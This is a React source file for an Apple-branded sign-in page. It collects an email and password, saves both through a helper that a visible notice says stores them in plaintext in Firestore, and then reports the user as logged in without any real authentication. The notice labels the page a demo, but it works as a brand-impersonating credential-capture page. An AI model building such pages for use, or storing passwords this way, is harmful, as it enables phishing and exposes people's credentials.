import { ArrowRightIcon, CheckIcon, KeyRoundIcon, MoonIcon, SunIcon } from 'lucide-react'
import { useRef, useState, type FormEvent } from 'react'
import { z } from 'zod'

import { Button } from '@/components/ui/button'
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/components/ui/card'
import { Field, FieldError, FieldGroup, FieldLabel } from '@/components/ui/field'
import { Input } from '@/components/ui/input'
import { Spinner } from '@/components/ui/spinner'
import { useTheme } from '@/hooks/use-theme'
import { saveLogin } from '@/lib/logins'
import { cn } from '@/lib/utils'
import appleLogoBlack from '../assets/Apple_logo_black.svg'
import appleLogoWhite from '../assets/Apple_logo_white.svg'

const emailSchema = z.email('Enter a valid email address.')
const passwordSchema = z.string().min(8, 'Password must be at least 8 characters.')

type Step = 'email' | 'password' | 'done'
type FieldState = 'idle' | 'invalid' | 'valid'

function shake(element: HTMLElement | null) {
  if (!element || window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
    return
  }

  element.animate(
    [
      { transform: 'translateX(0)' },
      { transform: 'translateX(-6px)' },
      { transform: 'translateX(6px)' },
      { transform: 'translateX(-4px)' },
      { transform: 'translateX(4px)' },
      { transform: 'translateX(0)' },
    ],
    { duration: 420, easing: 'ease-in-out' },
  )
}

export default function App() {
  const { theme, toggleTheme } = useTheme()
  const [step, setStep] = useState<Step>('email')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [emailState, setEmailState] = useState<FieldState>('idle')
  const [passwordState, setPasswordState] = useState<FieldState>('idle')
  const [emailError, setEmailError] = useState('')
  const [passwordError, setPasswordError] = useState('')
  const [saving, setSaving] = useState(false)
  const [saveError, setSaveError] = useState('')

  const emailWrapper = useRef<HTMLDivElement>(null)
  const passwordWrapper = useRef<HTMLDivElement>(null)

  function handleEmailContinue(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()

    const result = emailSchema.safeParse(email.trim())
    if (!result.success) {
      setEmailState('invalid')
      setEmailError(result.error.issues[0]?.message ?? 'Enter a valid email address.')
      shake(emailWrapper.current)
      return
    }

    setEmail(result.data)
    setEmailState('valid')
    setEmailError('')
    setStep('password')
  }

  async function handlePasswordSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()

    const result = passwordSchema.safeParse(password)
    if (!result.success) {
      setPasswordState('invalid')
      setPasswordError(result.error.issues[0]?.message ?? 'Invalid password.')
      shake(passwordWrapper.current)
      return
    }

    setPasswordState('valid')
    setPasswordError('')
    setSaving(true)
    setSaveError('')

    try {
      await saveLogin(email, password)
      setStep('done')
    } catch (error) {
      console.error('Failed to save login', error)
      setPasswordState('invalid')
      setSaveError('Could not save your details. Please try again.')
      shake(passwordWrapper.current)
    } finally {
      setSaving(false)
    }
  }

  function startOver() {
    setStep('email')
    setEmail('')
    setPassword('')
    setEmailState('idle')
    setPasswordState('idle')
    setEmailError('')
    setPasswordError('')
    setSaveError('')
  }

  return (
    <main className="flex min-h-svh flex-col bg-canvas p-5">
      <header className="flex w-full items-center justify-end">
        <Button
          type="button"
          variant="ghost"
          size="icon"
          onClick={toggleTheme}
          aria-label={theme === 'dark' ? 'Switch to light mode' : 'Switch to dark mode'}
        >
          {theme === 'dark' ? <SunIcon /> : <MoonIcon />}
        </Button>
      </header>

      <div className="flex flex-1 items-center justify-center py-6">
        <Card className="w-full max-w-[420px] gap-0 py-0 shadow-xl shadow-foreground/5">
          <CardHeader className="border-b px-8 pt-9 pb-7 text-center">
            <img
              src={theme === 'dark' ? appleLogoWhite : appleLogoBlack}
              alt="Apple"
              className="mx-auto mb-4 h-11 w-auto"
            />
            <CardTitle className="text-[28px] leading-tight tracking-tight">
              Sign in
            </CardTitle>
            <CardDescription className="mt-1.5">
              {step === 'done'
                ? 'You are logged in.'
                : 'Enter your details to continue.'}
            </CardDescription>
          </CardHeader>

          <CardContent className="px-8 py-8">
            {step === 'done' ? (
              <div className="flex flex-col items-center gap-5 py-6 text-center">
                <div className="flex size-12 items-center justify-center rounded-full bg-success/15 text-success">
                  <CheckIcon className="size-6" />
                </div>
                <p className="text-sm text-muted-foreground">
                  You are logged in as{' '}
                  <span className="font-medium text-foreground">{email}</span>.
                </p>
                <Button variant="outline" onClick={startOver}>
                  Sign out
                </Button>
              </div>
            ) : (
              <form
                className="flex flex-col gap-6"
                onSubmit={step === 'email' ? handleEmailContinue : handlePasswordSubmit}
                noValidate
              >
                <FieldGroup className="gap-5">
                  <Field data-invalid={emailState === 'invalid'}>
                    <FieldLabel htmlFor="email">Email</FieldLabel>
                    <div ref={emailWrapper} className="rounded-lg">
                      <Input
                        id="email"
                        type="email"
                        inputMode="email"
                        autoComplete="email"
                        autoFocus
                        placeholder="name@example.com"
                        value={email}
                        disabled={step !== 'email' || saving}
                        aria-invalid={emailState === 'invalid'}
                        onChange={(event) => {
                          setEmail(event.target.value)
                          if (emailState !== 'idle') {
                            setEmailState('idle')
                            setEmailError('')
                          }
                        }}
                        className={cn(
                          emailState === 'valid' &&
                            'border-success focus-visible:border-success focus-visible:ring-success/20',
                        )}
                      />
                    </div>
                    {emailState === 'valid' && (
                      <p className="flex items-center gap-1.5 text-sm text-success">
                        <CheckIcon className="size-3.5" /> Email looks good
                      </p>
                    )}
                    <FieldError>{emailError}</FieldError>
                  </Field>

                  {step === 'password' && (
                    <Field
                      data-invalid={passwordState === 'invalid'}
                      className="animate-in fade-in slide-in-from-top-2 duration-300"
                    >
                      <FieldLabel htmlFor="password">Password</FieldLabel>
                      <div ref={passwordWrapper} className="rounded-lg">
                        <Input
                          id="password"
                          type="password"
                          autoComplete="current-password"
                          autoFocus
                          placeholder="At least 8 characters"
                          value={password}
                          disabled={saving}
                          aria-invalid={passwordState === 'invalid'}
                          onChange={(event) => {
                            setPassword(event.target.value)
                            if (passwordState !== 'idle') {
                              setPasswordState('idle')
                              setPasswordError('')
                              setSaveError('')
                            }
                          }}
                          className={cn(
                            passwordState === 'valid' &&
                              'border-success focus-visible:border-success focus-visible:ring-success/20',
                          )}
                        />
                      </div>
                      {passwordState === 'valid' && !saving && (
                        <p className="flex items-center gap-1.5 text-sm text-success">
                          <CheckIcon className="size-3.5" /> Password looks good
                        </p>
                      )}
                      <FieldError>{passwordError || saveError}</FieldError>
                    </Field>
                  )}
                </FieldGroup>

                <div className="grid grid-cols-2 gap-3">
                  <Button type="submit" disabled={saving}>
                    {saving ? (
                      <>
                        <Spinner data-icon="inline-start" /> Saving…
                      </>
                    ) : step === 'email' ? (
                      <>
                        Continue <ArrowRightIcon data-icon="inline-end" />
                      </>
                    ) : (
                      <>
                        Sign in <ArrowRightIcon data-icon="inline-end" />
                      </>
                    )}
                  </Button>
                  <Button type="button" variant="outline" disabled={saving}>
                    Sign with passkey <KeyRoundIcon data-icon="inline-start" />
                  </Button>
                </div>
              </form>
            )}

            {step !== 'done' && (
              <p className="mt-6 text-center text-xs leading-relaxed text-muted-foreground">
                Demo only — credentials are stored in plaintext in Firestore.
                <br />
                Do not use a real password.
              </p>
            )}
          </CardContent>
        </Card>
      </div>
    </main>
  )
}
